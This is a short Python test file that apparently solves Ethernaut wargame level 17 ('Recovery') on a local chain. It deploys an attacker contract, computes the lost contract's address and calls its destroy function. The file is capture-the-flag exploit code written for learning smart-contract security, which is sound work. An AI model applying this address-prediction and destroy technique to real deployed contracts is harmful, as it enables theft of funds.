from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv17_recovery import Recovery
from pytypes.contracts.attacker.lv17_recovery import AttackRecovery
from pytypes.contracts.helper.lv17_helper_recovery import HelperRecovery


@default_chain.connect()
def test_lv17():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv17()
    foundContract = exploit_lv17(contract, ethernaut.attacker)
    helperContract = HelperRecovery.deploy()
    ethernaut.check_lv17(contract, helperContract,  foundContract)

def exploit_lv17(contract: Recovery, attacker: Account) -> Address:
    helperContract = AttackRecovery.deploy()
    addressOfLostContract = helperContract.generateAddress(contract.address) 
    helperContract.destroyContract(addressOfLostContract)
    return addressOfLostContract
